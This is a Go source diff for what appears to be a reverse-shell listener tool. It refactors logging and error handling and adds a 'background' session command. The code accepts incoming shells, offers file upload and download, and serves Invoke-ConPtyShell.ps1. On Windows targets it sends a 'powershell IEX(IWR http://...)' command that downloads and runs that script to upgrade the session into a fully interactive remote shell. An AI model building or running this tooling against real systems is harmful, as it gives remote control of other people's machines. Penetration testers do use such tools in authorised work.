@@ -18,26 +18,37 @@ import (
 	"golang.org/x/net/netutil"
 )
 
-func listenAndAcceptConnection(terminal *Terminal) {
+func listenAndAcceptConnection(terminal *Terminal) error {
 	var err error
 	localPort := ":" + strconv.Itoa(terminal.Options.Port)
-	terminal.listener, err = net.Listen("tcp", localPort)
+	terminal.Listener, err = net.Listen("tcp", localPort)
 	if err != nil {
-		log.Fatalln(err)
+		terminal.Log.Error(err)
+		return err
 	}
-	terminal.log.Notice("Listening on", localPort)
-	terminal.accept()
-	terminal.listener.Close()
+	terminal.Log.Notice("Listening on", localPort)
+	return terminal.accept()
 
 }
-func (terminal *Terminal) accept() {
+func (terminal *Terminal) accept() error {
 	var err error
 	//for {
-	terminal.Con, err = terminal.listener.Accept()
+	terminal.Con, err = terminal.Listener.Accept()
 	if err != nil {
-		log.Fatalln(err)
+		// This error is generated when the listener is closed with command Stop
+		if !strings.Contains(err.Error(), "use of closed network connection") {
+			terminal.Log.Error(err)
+		} else {
+			localPort := ":" + strconv.Itoa(terminal.Options.Port)
+			terminal.Log.Notice("The listener " + localPort + " has been stopped")
+		}
+		return err
 	}
-	terminal.log.Notice("Connect from", terminal.Con.RemoteAddr())
+	terminal.Log.Notice("Connect from", terminal.Con.RemoteAddr())
+	// Close the listener once the client is accepted
+	terminal.Listener.Close()
+
+	return nil
 
 }
 
@@ -60,7 +71,7 @@ func (terminal *Terminal) serveHTTPRevShellPowershell() {
 			}
 			//rice.MustFindBox("./static/Invoke-ConPtyShell.ps1").HTTPBox()
 			http.ServeContent(rw, r, "Invoke-ConPtyShell.ps1", time.Now(), file)
-			terminal.log.Debug("Invoke-ConPtyShell.ps1 have been served")
+			terminal.Log.Debug("Invoke-ConPtyShell.ps1 have been served")
 			//http.ServeFile(rw, r, ./static/Invoke-ConPtyShell.ps1)
 			listener.Close()
 
@@ -96,13 +107,13 @@ func (terminal *Terminal) getTerminalSize() {
 
 //Mettre dans utils network
 func (terminal *Terminal) sendStringToStream(str string) []byte {
-	terminal.log.Debug("Send string : " + str + " to stream")
+	terminal.Log.Debug("Send string : " + str + " to stream")
 	buf := []byte(str)
 	bufRead := make([]byte, 10240)
 	_, err := terminal.Con.Write(buf)
 
 	if err != nil {
-		terminal.log.Fatal("Write error: %s\n", err)
+		terminal.Log.Fatal("Write error: %s\n", err)
 	}
 	// Wait to catch the noisy output
 	time.Sleep(500 * time.Millisecond)
@@ -124,10 +135,16 @@ func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool
 	go func() {
 		defer func() {
 			if con, ok := dst.(net.Conn); ok {
-				con.Close()
-				terminal.log.Debugf("Connection from %v is closed\n", con.RemoteAddr())
+				if command != "background" {
+					con.Close()
+					terminal.Log.Debugf("Connection from %v is closed\n", con.RemoteAddr())
+					syncChannel <- 0 // Notify that processing is finished
+
+				} else {
+					syncChannel <- 1 // Notify that processing is backgrounded
+				}
 			}
-			syncChannel <- 0 // Notify that processing is finished
+
 		}()
 		for {
 			var nBytes int
@@ -136,7 +153,7 @@ func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool
 			nBytes, err = src.Read(buf)
 			if err != nil {
 				if err != io.EOF {
-					terminal.log.Criticalf("Read error: %s\n", err)
+					terminal.Log.Criticalf("Read error: %s\n", err)
 
 				}
 				break
@@ -149,26 +166,34 @@ func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool
 				if utils.SliceByteContains(buf, byte(13)) {
 					terminal.mutex.Lock()
 					command = strings.TrimSpace(command)
-					terminal.log.Debug("Command contains new line: " + command)
+					terminal.Log.Debug("Command contains new line: " + command)
 					firstKeyWord := strings.Split(command, " ")[0]
 					commandSplit := strings.Split(command, " ")
 					switch firstKeyWord {
 					case "upload":
-						terminal.log.Debug("Custom command upload")
+						terminal.Log.Debug("Custom command upload")
 						//fmt.Println("upload")
 						terminal.Upload(command)
 						//skip the command
 						nBytes = 0
 
 					case "download":
-						terminal.log.Debug("Custom command download")
+						terminal.Log.Debug("Custom command download")
 						terminal.Download(commandSplit[1])
 						//skip the command
 						nBytes = 0
 						dst.Write(bytes.Repeat(utils.Backspace, len(command)))
 
+					case "background":
+						terminal.Log.Debug("Custom command background")
+						//skip the command
+						terminal.mutex.Unlock()
+						nBytes = 0
+						dst.Write(bytes.Repeat(utils.Backspace, len(command)))
+						return
+
 					case "EXIT":
-						terminal.log.Debug("Custom command EXIT")
+						terminal.Log.Debug("Custom command EXIT")
 						terminal.mutex.Unlock()
 						return
 
@@ -188,7 +213,8 @@ func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool
 				_, err = dst.Write(buf[0:nBytes])
 			}
 			if err != nil {
-				terminal.log.Critical("Write error: %s\n", err)
+				terminal.Log.Critical("Write error: %s\n", err)
+				return
 
 			}
 
@@ -200,11 +226,11 @@ func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool
 
 func (terminal *Terminal) execute(cmd string) []byte {
 
-	terminal.log.Debug("Execute command: " + cmd)
+	terminal.Log.Debug("Execute command: " + cmd)
 	bufRead := make([]byte, 10240)
 	_, err := terminal.Con.Write([]byte(cmd + "\n"))
 	if err != nil {
-		terminal.log.Fatalf("Write error: %s\n", err)
+		terminal.Log.Fatalf("Write error: %s\n", err)
 	}
 	// Wait to catch the noisy output
 	time.Sleep(500 * time.Millisecond)
@@ -212,7 +238,7 @@ func (terminal *Terminal) execute(cmd string) []byte {
 	terminal.Con.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 	// Catch it to not hide it
 	terminal.Con.Read(bufRead)
-	terminal.log.Debug("Output of the command: " + string(bufRead))
+	terminal.Log.Debug("Output of the command: " + string(bufRead))
 	// Send new line to show the prompt
 	terminal.Con.Write([]byte("\n"))
 
@@ -230,7 +256,7 @@ func (terminal *Terminal) cleanCmd(cmd string) {
 func (terminal *Terminal) sttyRawEcho(state string) {
 	if state == "enable" {
 		// Terminal in raw mode
-		terminal.log.Debug("Execute stty raw -echo")
+		terminal.Log.Debug("Execute stty raw -echo")
 		rawMode := exec.Command("/bin/stty", "raw", "-echo")
 		rawMode.Stdin = os.Stdin
 		_ = rawMode.Run()
@@ -238,7 +264,7 @@ func (terminal *Terminal) sttyRawEcho(state string) {
 
 	} else if state == "disable" {
 		// Terminal in cooked mode
-		terminal.log.Debug("Execute stty raw")
+		terminal.Log.Debug("Execute stty raw")
 		rawModeOff := exec.Command("/bin/stty", "-raw", "echo")
 		rawModeOff.Stdin = os.Stdin
 		_ = rawModeOff.Run()
@@ -256,7 +282,7 @@ func (terminal *Terminal) interactiveReverseShellLinux() {
 func (terminal *Terminal) interactiveReverseShellWindows() {
 	terminal.getTerminalSize()
 	command := `powershell IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
-	terminal.log.Debug("Send the command: " + command)
+	terminal.Log.Debug("Send the command: " + command)
 	terminal.execute(command)
 	terminal.Con.Close()
 }
